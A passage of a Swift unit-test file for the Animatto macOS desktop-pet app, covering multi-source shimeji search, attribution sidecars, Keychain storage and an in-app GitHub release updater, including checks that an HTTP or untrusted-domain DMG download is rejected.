    guard let data = try? encoder.encode(original) else {
        TestHarness.assertTrue(false, "Failed to encode ShimejiSearchResult")
        return
    }

    let decoder = JSONDecoder()
    guard let decoded = try? decoder.decode(ShimejiSearchResult.self, from: data) else {
        TestHarness.assertTrue(false, "Failed to decode ShimejiSearchResult")
        return
    }

    TestHarness.assertEqual(decoded.name, "Hatsune Miku", message: "Decoded name matches")
    TestHarness.assertEqual(decoded.uploader, "Crypton", message: "Decoded uploader matches")
    TestHarness.assertEqual(decoded.fileSize, "24 KB", message: "Decoded fileSize matches")
    TestHarness.assertEqual(decoded.type, ".png", message: "Decoded type matches")
    TestHarness.assertEqual(decoded.tags, ["miku", "vocaloid"], message: "Decoded tags match")

    print("  testShimejiSearchResultCodableRoundTrip: PASSED")
}

// MARK: - Rebuilt Multi-Source Shimeji Search Unit Tests

private struct MockFailingSourceProvider: ShimejiSourceProvider {
    let sourceId = "failing_mock"
    let displayName = "Failing Mock"
    let category = ShimejiSourceCategory.gitHub
    let isDownloadable = false
    
    func search(query: String) async throws -> [ShimejiSearchResult] {
        throw WorkshopError.networkError("Simulated provider network outage")
    }
}

@MainActor
func testRebuiltMultiSourceShimejiSearchCoordinator() {
    print("Running testRebuiltMultiSourceShimejiSearchCoordinator...")
    
    // 1. Coordinator with CuratedCommunity + OpenGameArt + MockFailing
    let coordinator = UnifiedShimejiSearchCoordinator(providers: [
        CuratedCommunitySourceProvider(),
        OpenGameArtSourceProvider(),
        MockFailingSourceProvider(),
        ExternalDirectorySourceProvider()
    ])
    
    var completed = false
    var testResults: [ShimejiSearchResult] = []
    
    Task {
        testResults = await coordinator.search(query: "slime", selectedCategory: .all)
        completed = true
    }
    
    let deadline = Date().addingTimeInterval(3.0)
    while !completed && Date() < deadline {
        RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
    }
    
    TestHarness.assertTrue(completed, "Coordinator finished concurrent search")
    TestHarness.assertTrue(!testResults.isEmpty, "Found slime results across providers")
    
    // Verify fault isolation: failing mock did NOT break other providers
    let hasCommunity = testResults.contains { $0.sourceCategory == .community }
    let hasOpenGameArt = testResults.contains { $0.sourceCategory == .openGameArt }
    TestHarness.assertTrue(hasCommunity || hasOpenGameArt, "Results collected from healthy providers despite failing mock")
    
    // 2. Source category filtering
    var externalOnly: [ShimejiSearchResult] = []
    var externalCompleted = false
    Task {
        externalOnly = await coordinator.search(query: "cat", selectedCategory: .externalDirectories)
        externalCompleted = true
    }
    let extDeadline = Date().addingTimeInterval(3.0)
    while !externalCompleted && Date() < extDeadline {
        RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
    }
    TestHarness.assertTrue(externalCompleted, "External filter search completed")
    TestHarness.assertTrue(!externalOnly.isEmpty, "Found external directory cards for cat")
    for r in externalOnly {
        TestHarness.assertEqual(r.sourceCategory, ShimejiSourceCategory.externalDirectories, message: "Category is externalDirectories")
        TestHarness.assertFalse(r.isDownloadable, "External directories are not directly downloadable")
        TestHarness.assertTrue(r.webPageURL != nil, "External directories have valid webPageURL")
    }
    
    print("  testRebuiltMultiSourceShimejiSearchCoordinator: PASSED")
}

func testRebuiltShimejiLicensingAndAttribution() {
    print("Running testRebuiltShimejiLicensingAndAttribution...")
    
    // 1. AssetLicenseType enum validation
    for license in AssetLicenseType.allCases {
        TestHarness.assertTrue(!license.displayName.isEmpty, "License \(license.rawValue) has non-empty displayName")
        TestHarness.assertTrue(!license.shortDescription.isEmpty, "License \(license.rawValue) has non-empty description")
        TestHarness.assertTrue(license.colorHex.hasPrefix("#"), "License \(license.rawValue) has valid hex color")
    }
    
    // 2. ShimejiSourceCategory validation
    for cat in ShimejiSourceCategory.allCases {
        TestHarness.assertTrue(!cat.displayName.isEmpty, "Category \(cat.rawValue) has non-empty displayName")
        TestHarness.assertTrue(!cat.iconName.isEmpty, "Category \(cat.rawValue) has SF Symbol icon")
    }
    
    // 3. Community Asset Attribution sidecar writing & reading
    let tempDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("animatto_attr_test_\(UUID().uuidString)")
    try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: tempDir) }
    
    let mockFile = tempDir.appendingPathComponent("test_pet.png")
    try? Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]).write(to: mockFile)
    
    let attr = CommunityAssetAttribution(
        name: "Test Companion",
        uploader: "Artist",
        fileSize: "24 KB",
        format: ".png",
        sourceURL: "https://example.com/pet.png",
        license: "CC-BY 4.0",
        dateImported: Date(),
        isLocalOnly: false
    )
    attr.saveSidecar(for: mockFile)
    
    let loaded = CommunityAssetAttribution.loadSidecar(for: mockFile)
    TestHarness.assertTrue(loaded != nil, "Sidecar loaded successfully")
    TestHarness.assertEqual(loaded?.name, "Test Companion", message: "Sidecar companion name matches")
    TestHarness.assertEqual(loaded?.license, "CC-BY 4.0", message: "Sidecar license matches")
    
    print("  testRebuiltShimejiLicensingAndAttribution: PASSED")
}

@MainActor
func testMultiSourceQueryRelevanceAndSanitization() {
    print("Running testMultiSourceQueryRelevanceAndSanitization...")
    
    let service = WorkshopService.shared
    
    // Test all required test queries: miku, pikachu, cat, anime, bunny, slime
    let queries = ["miku", "pikachu", "cat", "anime", "bunny", "slime"]
    for q in queries {
        var results: [ShimejiSearchResult] = []
        var done = false
        Task {
            results = (try? await service.searchShimejiDB(query: q, category: .community)) ?? []
            done = true
        }
        let dl = Date().addingTimeInterval(3.0)
        while !done && Date() < dl {
            RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
        }
        TestHarness.assertTrue(done, "Search query '\(q)' completed")
        TestHarness.assertTrue(!results.isEmpty, "Query '\(q)' returned relevant results")
    }
    
    // Nonexistent term -> zero results (no bogus Pikachu)
    var bogusDone = false
    var bogusResults: [ShimejiSearchResult] = []
    Task {
        bogusResults = (try? await service.searchShimejiDB(query: "xyz999nonexistentquery", category: .community)) ?? []
        bogusDone = true
    }
    let bdl = Date().addingTimeInterval(3.0)
    while !bogusDone && Date() < bdl {
        RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
    }
    TestHarness.assertTrue(bogusDone, "Nonexistent query completed")
    TestHarness.assertTrue(bogusResults.isEmpty, "Nonexistent query returns exactly 0 results")
    
    print("  testMultiSourceQueryRelevanceAndSanitization: PASSED")
}

func testKeychainCredentialStorageAndLegacyMigration() {
    print("Running testKeychainCredentialStorageAndLegacyMigration...")
    let storage = KeychainCredentialStorage.shared
    let testKey = "unit_test_secret_key"
    
    // 1. Save and read
    let saved = storage.save(key: testKey, value: "sk-mock-12345678")
    TestHarness.assertTrue(saved, "Saved credential to Keychain")
    let retrieved = storage.read(key: testKey)
    TestHarness.assertEqual(retrieved, "sk-mock-12345678", message: "Retrieved matching credential from Keychain")
    
    // 2. Delete
    let deleted = storage.delete(key: testKey)
    TestHarness.assertTrue(deleted, "Deleted credential from Keychain")
    TestHarness.assertTrue(storage.read(key: testKey) == nil, "Deleted credential no longer accessible")
    
    // 3. Test legacy migration
    UserDefaults.standard.set("legacy-secret-token", forKey: "cloudVisionApiKey")
    _ = KeychainCredentialStorage()
    TestHarness.assertTrue(UserDefaults.standard.object(forKey: "cloudVisionApiKey") == nil, "Legacy preference purged from UserDefaults")
    _ = storage.delete(key: "cloud_vision_api_key")
}

func testPresetGalleryArchetypesAndVoiceSamples() {
    print("Running testPresetGalleryArchetypesAndVoiceSamples...")
    
    let allPresets = PersonalityPreset.allCases
    TestHarness.assertEqual(allPresets.count, 10, message: "Exactly 10 personality archetypes available")
    
    for preset in allPresets {
        let profile = PersonalityProfile.preset(preset)
        TestHarness.assertFalse(preset.displayName.isEmpty, "Preset has non-empty display name")
        TestHarness.assertFalse(preset.iconName.isEmpty, "Preset has non-empty SF symbol icon")
        TestHarness.assertFalse(preset.summary.isEmpty, "Preset has non-empty summary")
        
        // Ensure normalized bounds for traits
        TestHarness.assertTrue(profile.energy >= 0.0 && profile.energy <= 1.0, "Energy within 0..1")
        TestHarness.assertTrue(profile.sociability >= 0.0 && profile.sociability <= 1.0, "Sociability within 0..1")
        TestHarness.assertTrue(profile.playfulness >= 0.0 && profile.playfulness <= 1.0, "Playfulness within 0..1")
        TestHarness.assertTrue(profile.shyness >= 0.0 && profile.shyness <= 1.0, "Shyness within 0..1")
        TestHarness.assertTrue(profile.independence >= 0.0 && profile.independence <= 1.0, "Independence within 0..1")
    }
}

func testVisionEngineGracefulErrorHandling() {
    print("Running testVisionEngineGracefulErrorHandling...")
    
    // Corrupt / unreadable image file
    let tempURL = URL(fileURLWithPath: "/tmp/corrupt_file_\(UUID().uuidString).gif")
    try? Data([0x00, 0x01, 0x02, 0x03]).write(to: tempURL)
    defer { try? FileManager.default.removeItem(at: tempURL) }
    
    var caughtError = false
    do {
        _ = try VisionBackgroundRemover.shared.removeBackgroundFromGIF(sourceURL: tempURL)
    } catch {
        caughtError = true
    }
    TestHarness.assertTrue(caughtError, "Vision engine handles corrupt file without crashing")
    
    // Cancellation handler test
    let validGIFURL = URL(fileURLWithPath: "/tmp/test_cancel_\(UUID().uuidString).gif")
    let gifBytes: [UInt8] = [0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3B]
    try? Data(gifBytes).write(to: validGIFURL)
    defer { try? FileManager.default.removeItem(at: validGIFURL) }
    
    var caughtCancelled = false
    do {
        _ = try VisionBackgroundRemover.shared.removeBackgroundFromGIF(sourceURL: validGIFURL, isCancelled: { true })
    } catch WorkshopError.cancelled {
        caughtCancelled = true
    } catch {}
    TestHarness.assertTrue(caughtCancelled, "Vision engine honors cancellation token")
}

// MARK: - Phase 12: In-App Updater & Release Quality Tests

class MockUpdateURLProtocol: URLProtocol {
    static var responseProvider: ((URLRequest) throws -> (HTTPURLResponse, Data))?
    
    override class func canInit(with request: URLRequest) -> Bool {
        return true
    }
    
    override class func canonicalRequest(for request: URLRequest) -> URLRequest {
        return request
    }
    
    override func startLoading() {
        guard let provider = MockUpdateURLProtocol.responseProvider else {
            client?.urlProtocol(self, didFailWithError: NSError(domain: NSURLErrorDomain, code: NSURLErrorUnknown))
            return
        }
        
        do {
            let (response, data) = try provider(request)
            client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
            client?.urlProtocol(self, didLoad: data)
            client?.urlProtocolDidFinishLoading(self)
        } catch {
            client?.urlProtocol(self, didFailWithError: error)
        }
    }
    
    override func stopLoading() {}
}

func makeMockUpdateSession() -> URLSession {
    let config = URLSessionConfiguration.ephemeral
    config.protocolClasses = [MockUpdateURLProtocol.self]
    return URLSession(configuration: config)
}

func testSemanticVersionParsingAndComparison() {
    print("Running testSemanticVersionParsingAndComparison...")
    
    // 1. Basic parsing
    let v1 = SemanticVersion(string: "1.0.0")
    TestHarness.assertTrue(v1 != nil, "1.0.0 parsed successfully")
    TestHarness.assertEqual(v1?.components, [1, 0, 0], message: "Components are [1, 0, 0]")
    TestHarness.assertTrue(v1?.prerelease == nil, "No prerelease")
    TestHarness.assertTrue(v1?.isPrerelease == false, "isPrerelease is false")
    
    // 2. Prefixes ('v' and 'V')
    let v2 = SemanticVersion(string: "v1.2.3")
    TestHarness.assertTrue(v2 != nil, "v1.2.3 parsed successfully")
    TestHarness.assertEqual(v2?.components, [1, 2, 3], message: "Prefix 'v' stripped")
    
    let v3 = SemanticVersion(string: "V2.4.0")
    TestHarness.assertTrue(v3 != nil, "V2.4.0 parsed successfully")
    TestHarness.assertEqual(v3?.components, [2, 4, 0], message: "Prefix 'V' stripped")
    
    // 3. Partial components (e.g., "1.0")
    let vTwo = SemanticVersion(string: "1.0")
    TestHarness.assertTrue(vTwo != nil, "1.0 parsed")
    TestHarness.assertEqual(vTwo?.components, [1, 0], message: "Components [1, 0]")
    TestHarness.assertTrue(vTwo! == v1!, "1.0 equals 1.0.0 due to zero-padding")
    
    // 4. Prereleases
    let vBeta = SemanticVersion(string: "1.0.0-beta.1")
    TestHarness.assertTrue(vBeta != nil, "Prerelease parsed")
    TestHarness.assertEqual(vBeta?.prerelease, "beta.1", message: "Prerelease is beta.1")
    TestHarness.assertTrue(vBeta?.isPrerelease == true, "isPrerelease is true")
    
    // 5. Build metadata
    let vBuild = SemanticVersion(string: "1.0.0+20261028")
    TestHarness.assertTrue(vBuild != nil, "Build metadata parsed")
    TestHarness.assertEqual(vBuild?.buildMetadata, "20261028", message: "Metadata extracted")
    TestHarness.assertTrue(vBuild! == v1!, "Build metadata does not affect version equality")
    
    // 6. Invalid versions
    TestHarness.assertTrue(SemanticVersion(string: "") == nil, "Empty string is invalid")
    TestHarness.assertTrue(SemanticVersion(string: "   ") == nil, "Whitespace is invalid")
    TestHarness.assertTrue(SemanticVersion(string: "beta") == nil, "Word only is invalid")
    TestHarness.assertTrue(SemanticVersion(string: "v") == nil, "v only is invalid")
    TestHarness.assertTrue(SemanticVersion(string: "1.x.3") == nil, "Non-digit component is invalid")
    
    // 7. Comparison tests
    let v100 = SemanticVersion(string: "1.0.0")!
    let v101 = SemanticVersion(string: "1.0.1")!
    let v110 = SemanticVersion(string: "1.1.0")!
    let v200 = SemanticVersion(string: "2.0.0")!
    
    TestHarness.assertTrue(v100 < v101, "1.0.0 < 1.0.1")
    TestHarness.assertTrue(v101 < v110, "1.0.1 < 1.1.0")
    TestHarness.assertTrue(v110 < v200, "1.1.0 < 2.0.0")
    TestHarness.assertTrue(v200 > v100, "2.0.0 > 1.0.0")
    
    // SemVer 2.0 Prerelease precedence:
    // 1.0.0-alpha < 1.0.0-beta < 1.0.0-rc.1 < 1.0.0
    let vAlpha = SemanticVersion(string: "1.0.0-alpha")!
    let vBeta1 = SemanticVersion(string: "1.0.0-beta.1")!
    let vBeta2 = SemanticVersion(string: "1.0.0-beta.2")!
    let vRC = SemanticVersion(string: "1.0.0-rc.1")!
    
    TestHarness.assertTrue(vAlpha < vBeta1, "alpha < beta.1")
    TestHarness.assertTrue(vBeta1 < vBeta2, "beta.1 < beta.2")
    TestHarness.assertTrue(vBeta2 < vRC, "beta.2 < rc.1")
    TestHarness.assertTrue(vRC < v100, "rc.1 < 1.0.0 (Normal release has higher precedence than prerelease)")
    TestHarness.assertTrue(v100 > vRC, "1.0.0 > rc.1")
}

func testGitHubReleaseJSONDecoding() {
    print("Running testGitHubReleaseJSONDecoding...")
    
    let jsonString = """
    [
      {
        "id": 101,
        "tag_name": "v1.2.0",
        "name": "Animatto 1.2.0: Spring Sparkles",
        "body": "### Features\\n- Added new ambient companions.\\n- Improved performance.",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.2.0",
        "published_at": "2026-10-28T10:00:00Z",
        "prerelease": false,
        "draft": false,
        "assets": [
          {
            "id": 501,
            "name": "Animatto-v1.2.0.dmg",
            "content_type": "application/x-apple-diskimage",
            "size": 45000000,
            "download_count": 42,
            "browser_download_url": "https://github.com/sharmao07/Animatto/releases/download/v1.2.0/Animatto-v1.2.0.dmg"
          }
        ]
      },
      {
        "id": 102,
        "tag_name": "v1.3.0-beta.1",
        "name": "Animatto 1.3.0 Beta",
        "body": "Preview of upcoming features.",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.3.0-beta.1",
        "published_at": "2026-10-28T12:00:00Z",
        "prerelease": true,
        "draft": false,
        "assets": []
      }
    ]
    """
    
    let decoder = JSONDecoder()
    decoder.dateDecodingStrategy = .iso8601
    guard let data = jsonString.data(using: .utf8),
          let releases = try? decoder.decode([AppReleaseInfo].self, from: data) else {
        TestHarness.assertTrue(false, "Failed to decode valid release JSON")
        return
    }
    
    TestHarness.assertEqual(releases.count, 2, message: "Decoded 2 releases")
    
    let rel1 = releases[0]
    TestHarness.assertEqual(rel1.id, 101, message: "Release 1 ID matches")
    TestHarness.assertEqual(rel1.tagName, "v1.2.0", message: "Tag name matches")
    TestHarness.assertEqual(rel1.displayTitle, "Animatto 1.2.0: Spring Sparkles", message: "Display title matches")
    TestHarness.assertEqual(rel1.semanticVersion?.description, "1.2.0", message: "Semantic version matches 1.2.0")
    TestHarness.assertTrue(rel1.isPrerelease == false, "Release 1 is not a prerelease")
    TestHarness.assertTrue(rel1.isDraft == false, "Release 1 is not a draft")
    TestHarness.assertEqual(rel1.assets.count, 1, message: "Release 1 has 1 asset")
    
    let rel2 = releases[1]
    TestHarness.assertEqual(rel2.tagName, "v1.3.0-beta.1", message: "Tag name matches")
    TestHarness.assertTrue(rel2.isPrerelease == true, "Release 2 is a prerelease")
}

func testReleaseAssetValidation() {
    print("Running testReleaseAssetValidation...")
    
    // 1. Valid GitHub DMG asset
    let validDMG = ReleaseAssetInfo(
        id: 1,
        name: "Animatto-v1.1.0.dmg",
        contentType: "application/octet-stream",
        size: 52428800,
        downloadCount: 15,
        browserDownloadURL: URL(string: "https://github.com/sharmao07/Animatto/releases/download/v1.1.0/Animatto-v1.1.0.dmg")!
    )
    TestHarness.assertTrue(validDMG.isDMG, "File ending with .dmg recognized as DMG")
    TestHarness.assertTrue(validDMG.isVerifiedSource, "Official HTTPS github.com URL is verified source")
    
    // 2. Verified GitHub objects CDN
    let cdnDMG = ReleaseAssetInfo(
        id: 2,
        name: "Animatto.dmg",
        contentType: "application/x-apple-diskimage",
        size: 52428800,
        downloadCount: 5,
        browserDownloadURL: URL(string: "https://objects.githubusercontent.com/github-production-release-asset-2e650e/Animatto.dmg")!
    )
    TestHarness.assertTrue(cdnDMG.isDMG, "File ending with .dmg is recognized")
    TestHarness.assertTrue(cdnDMG.isVerifiedSource, "objects.githubusercontent.com is verified source")
    
    // 3. Non-DMG asset
    let zipAsset = ReleaseAssetInfo(
        id: 3,
        name: "Animatto-source.zip",
        contentType: "application/zip",
        size: 1048576,
        downloadCount: 2,
        browserDownloadURL: URL(string: "https://github.com/sharmao07/Animatto/archive/v1.1.0.zip")!
    )
    TestHarness.assertTrue(!zipAsset.isDMG, "Zip file is not recognized as DMG")
    
    // 4. Insecure HTTP source
    let insecureAsset = ReleaseAssetInfo(
        id: 4,
        name: "Animatto.dmg",
        contentType: "application/octet-stream",
        size: 52428800,
        downloadCount: 1,
        browserDownloadURL: URL(string: "http://github.com/sharmao07/Animatto/releases/Animatto.dmg")!
    )
    TestHarness.assertTrue(!insecureAsset.isVerifiedSource, "Insecure HTTP source rejected")
    
    // 5. Untrusted external domain
    let untrustedAsset = ReleaseAssetInfo(
        id: 5,
        name: "Animatto.dmg",
        contentType: "application/octet-stream",
        size: 52428800,
        downloadCount: 1,
        browserDownloadURL: URL(string: "https://malicious-phishing-site.com/Animatto.dmg")!
    )
    TestHarness.assertTrue(!untrustedAsset.isVerifiedSource, "Untrusted host rejected")
    
    // 6. Release primary DMG selection
    let mixedRelease = AppReleaseInfo(
        id: 200,
        tagName: "v1.1.0",
        name: "Release 1.1.0",
        body: "Update notes",
        htmlURL: URL(string: "https://github.com/sharmao07/Animatto/releases/tag/v1.1.0")!,
        assets: [zipAsset, untrustedAsset, validDMG]
    )
    TestHarness.assertTrue(mixedRelease.primaryDMGAsset != nil, "Release selects primary DMG asset")
    TestHarness.assertEqual(mixedRelease.primaryDMGAsset?.id, validDMG.id, message: "Primary DMG is the verified DMG asset")
}

func testUpdateCheckLifecycleAndStates() {
    print("Running testUpdateCheckLifecycleAndStates...")
    
    let mockSession = makeMockUpdateSession()
    let service = UpdateService(session: mockSession)
    service.installedVersionProvider = { SemanticVersion(major: 1, minor: 0, patch: 0) }
    service.clearDismissal()
    
    let endpoint = URL(string: UpdateConfiguration.shared.apiEndpoint)!
    
    // Subtest A: Newer version available (v1.2.0 vs 1.0.0)
    let semA = DispatchSemaphore(value: 0)
    let jsonA = """
    [
      {
        "id": 10,
        "tag_name": "v1.2.0",
        "name": "Version 1.2.0",
        "body": "Exciting new release!",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.2.0",
        "prerelease": false,
        "draft": false,
        "assets": []
      }
    ]
    """.data(using: .utf8)!
    
    MockUpdateURLProtocol.responseProvider = { _ in
        let resp = HTTPURLResponse(url: endpoint, statusCode: 200, httpVersion: nil, headerFields: nil)!
        return (resp, jsonA)
    }
    
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        switch result {
        case .updateAvailable(let release, let installed):
            TestHarness.assertEqual(release.tagName, "v1.2.0", message: "Available release is v1.2.0")
            TestHarness.assertEqual(installed.description, "1.0.0", message: "Installed is 1.0.0")
        default:
            TestHarness.assertTrue(false, "Expected .updateAvailable, got \(result)")
        }
        TestHarness.assertEqual(service.availableRelease?.tagName, "v1.2.0", message: "availableRelease property set")
        if case .updateAvailable(let rel, _) = service.state {
            TestHarness.assertEqual(rel.tagName, "v1.2.0", message: "state matches updateAvailable")
        } else {
            TestHarness.assertTrue(false, "state should be .updateAvailable")
        }
        semA.signal()
    }
    _ = semA.wait(timeout: .now() + 5.0)
    
    // Subtest B: Already up to date (v1.0.0 vs 1.0.0)
    let semB = DispatchSemaphore(value: 0)
    let jsonB = """
    [
      {
        "id": 11,
        "tag_name": "v1.0.0",
        "name": "Version 1.0.0",
        "body": "Initial release",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.0.0",
        "prerelease": false,
        "draft": false,
        "assets": []
      }
    ]
    """.data(using: .utf8)!
    
    MockUpdateURLProtocol.responseProvider = { _ in
        let resp = HTTPURLResponse(url: endpoint, statusCode: 200, httpVersion: nil, headerFields: nil)!
        return (resp, jsonB)
    }
    
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        TestHarness.assertEqual(result, UpdateCheckResult.upToDate(installed: SemanticVersion(major: 1, minor: 0, patch: 0)), message: "Reports upToDate")
        TestHarness.assertTrue(service.availableRelease == nil, "availableRelease is nil when up to date")
        if case .upToDate(let ver, _) = service.state {
            TestHarness.assertEqual(ver, "1.0.0", message: "State is up to date with 1.0.0")
        } else {
            TestHarness.assertTrue(false, "State should be .upToDate")
        }
        semB.signal()
    }
    _ = semB.wait(timeout: .now() + 5.0)
    
    // Subtest C: Prerelease filtering
    let jsonC = """
    [
      {
        "id": 12,
        "tag_name": "v1.3.0-beta.1",
        "name": "Beta 1.3.0",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.3.0-beta.1",
        "prerelease": true,
        "draft": false,
        "assets": []
      }
    ]
    """.data(using: .utf8)!
    
    MockUpdateURLProtocol.responseProvider = { _ in
        let resp = HTTPURLResponse(url: endpoint, statusCode: 200, httpVersion: nil, headerFields: nil)!
        return (resp, jsonC)
    }
    
    // With prereleases disabled
    UpdateConfiguration.shared.includePrereleases = false
    let semC1 = DispatchSemaphore(value: 0)
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        TestHarness.assertEqual(result, UpdateCheckResult.upToDate(installed: SemanticVersion(major: 1, minor: 0, patch: 0)), message: "Prerelease ignored when opted out")
        semC1.signal()
    }
    _ = semC1.wait(timeout: .now() + 5.0)
    
    // With prereleases enabled
    UpdateConfiguration.shared.includePrereleases = true
    let semC2 = DispatchSemaphore(value: 0)
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        if case .updateAvailable(let rel, _) = result {
            TestHarness.assertEqual(rel.tagName, "v1.3.0-beta.1", message: "Prerelease accepted when opted in")
        } else {
            TestHarness.assertTrue(false, "Expected updateAvailable for beta")
        }
        semC2.signal()
    }
    _ = semC2.wait(timeout: .now() + 5.0)
    UpdateConfiguration.shared.includePrereleases = false
    
    // Subtest D: Rate Limit (HTTP 403)
    let semD = DispatchSemaphore(value: 0)
    MockUpdateURLProtocol.responseProvider = { _ in
        let resp = HTTPURLResponse(url: endpoint, statusCode: 403, httpVersion: nil, headerFields: nil)!
        return (resp, Data())
    }
    
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        if case .failed(let err) = result {
            TestHarness.assertTrue(err.contains("rate limit"), "Reports rate limit on 403")
        } else {
            TestHarness.assertTrue(false, "Expected .failed on 403")
        }
        if case .error(let msg) = service.state {
            TestHarness.assertTrue(msg.contains("rate limit"), "State contains rate limit error")
        } else {
            TestHarness.assertTrue(false, "State should be .error")
        }
        semD.signal()
    }
    _ = semD.wait(timeout: .now() + 5.0)
    
    // Subtest E: Timeout Error
    let semE = DispatchSemaphore(value: 0)
    MockUpdateURLProtocol.responseProvider = { _ in
        throw NSError(domain: NSURLErrorDomain, code: NSURLErrorTimedOut, userInfo: [NSLocalizedDescriptionKey: "The request timed out."])
    }
    
    Task {
        let result = await service.checkForUpdates(isManualCheck: true)
        if case .failed(let err) = result {
            TestHarness.assertTrue(err.contains("timed out"), "Reports timed out error")
        } else {
            TestHarness.assertTrue(false, "Expected .failed on timeout")
        }
        semE.signal()
    }
    _ = semE.wait(timeout: .now() + 5.0)
}

func testDismissalCooldownAndManualOverride() {
    print("Running testDismissalCooldownAndManualOverride...")
    
    let mockSession = makeMockUpdateSession()
    let service = UpdateService(session: mockSession)
    service.installedVersionProvider = { SemanticVersion(major: 1, minor: 0, patch: 0) }
    service.clearDismissal()
    
    var simulatedNow = Date()
    service.nowProvider = { simulatedNow }
    
    let endpoint = URL(string: UpdateConfiguration.shared.apiEndpoint)!
    let jsonRelease = """
    [
      {
        "id": 50,
        "tag_name": "v1.5.0",
        "name": "Version 1.5.0",
        "html_url": "https://github.com/sharmao07/Animatto/releases/tag/v1.5.0",
        "prerelease": false,
        "draft": false,
        "assets": []
      }
    ]
    """.data(using: .utf8)!
    
    MockUpdateURLProtocol.responseProvider = { _ in
        let resp = HTTPURLResponse(url: endpoint, statusCode: 200, httpVersion: nil, headerFields: nil)!
        return (resp, jsonRelease)
    }
    
    // 1. Initial check discovers v1.5.0
    let sem1 = DispatchSemaphore(value: 0)
    Task {
        _ = await service.checkForUpdates(isManualCheck: true)
        sem1.signal()
    }
    _ = sem1.wait(timeout: .now() + 5.0)
    
    if case .updateAvailable(let rel, _) = service.state {
        TestHarness.assertEqual(rel.tagName, "v1.5.0", message: "Update v1.5.0 available")
    } else {
        TestHarness.assertTrue(false, "Expected updateAvailable")
    }
    
    // 2. User dismisses update
    service.dismissCurrentUpdate()
    TestHarness.assertEqual(service.state, UpdateUIState.idle, message: "Dismissing update resets state to idle")
    TestHarness.assertTrue(service.isVersionDismissed(SemanticVersion(string: "1.5.0")!), "Version 1.5.0 is marked dismissed")
    
    // 3. Background check (isManualCheck: false) suppresses notification
    let sem2 = DispatchSemaphore(value: 0)
    Task {
        _ = await service.checkForUpdates(isManualCheck: false)
        sem2.signal()
    }
    _ = sem2.wait(timeout: .now() + 5.0)
    TestHarness.assertEqual(service.state, UpdateUIState.idle, message: "Background check stays idle when version is dismissed")
    
    // 4. Manual check (isManualCheck: true) overrides dismissal
    let sem3 = DispatchSemaphore(value: 0)
    Task {
        _ = await service.checkForUpdates(isManualCheck: true)
        sem3.signal()
    }
    _ = sem3.wait(timeout: .now() + 5.0)
    if case .updateAvailable = service.state {
        TestHarness.assertTrue(true, "Manual check overrides dismissal and displays update")
    } else {
        TestHarness.assertTrue(false, "Manual check must bypass dismissal")
    }
    
    // 5. Newer version (v1.6.0) is NOT dismissed
    let v160 = SemanticVersion(string: "1.6.0")!
    TestHarness.assertTrue(!service.isVersionDismissed(v160), "Newer version 1.6.0 supersedes dismissal of 1.5.0")
    
    // 6. Cooldown elapsed (8 days later) allows re-prompting v1.5.0
    simulatedNow = simulatedNow.addingTimeInterval(8 * 24 * 3600)
    TestHarness.assertTrue(!service.isVersionDismissed(SemanticVersion(string: "1.5.0")!), "After 7-day cooldown, 1.5.0 is no longer dismissed")
}

func testSemanticVersionNightlyParsingAndOrdering() {
    print("Running testSemanticVersionNightlyParsingAndOrdering...")
    
    // 1. Parse standard nightly tag "nightly-20261030-4293c9c"
    let n1 = SemanticVersion(string: "nightly-20261030-4293c9c")
    TestHarness.assertTrue(n1 != nil, "Parsed nightly-20261030-4293c9c successfully")
    TestHarness.assertEqual(n1?.components, [2026, 10, 30], message: "Date components 2026.10.30")
    TestHarness.assertTrue(n1?.isPrerelease == true, "Nightly marked as prerelease")
    
    // 2. Parse hyphenated date "nightly-2026-10-30-58b15d2"
    let n2 = SemanticVersion(string: "nightly-2026-10-30-58b15d2")
    TestHarness.assertTrue(n2 != nil, "Parsed hyphenated date nightly")
    TestHarness.assertEqual(n2?.components, [2026, 10, 30], message: "Date components match")
    
    // 3. Comparison with regular semver release
    let stable = SemanticVersion(string: "1.1.1")!
    TestHarness.assertTrue(n1! > stable, "Nightly (2026.10.30) is newer than stable 1.1.1")
    
    // 4. Comparison between consecutive nightly dates
    let n3 = SemanticVersion(string: "nightly-20261031-abcdef0")!
    TestHarness.assertTrue(n3 > n1!, "Nightly on 2026.10.31 is newer than 2026.10.30")
    
    // 5. Normal release vs prerelease with same base version
    let v2_normal = SemanticVersion(major: 2, minor: 0, patch: 0)
    let v2_pre = SemanticVersion(major: 2, minor: 0, patch: 0, prerelease: "rc.1")
    TestHarness.assertTrue(v2_normal > v2_pre, "Normal release beats prerelease")
}

func testDownloadProgressFormattingAndMath() {
    print("Running testDownloadProgressFormattingAndMath...")
    
    let p1 = DownloadProgress(
        bytesDownloaded: 15_000_000,
        totalBytesExpected: 30_000_000,
        fractionCompleted: 0.5,
        speedBytesPerSecond: 1_500_000,
        timeRemainingSeconds: 10
    )
    
    TestHarness.assertEqual(p1.fractionCompleted, 0.5, message: "Fraction is 50%")
    TestHarness.assertTrue(p1.formattedDownloaded.contains("15"), "Formatted downloaded contains 15")
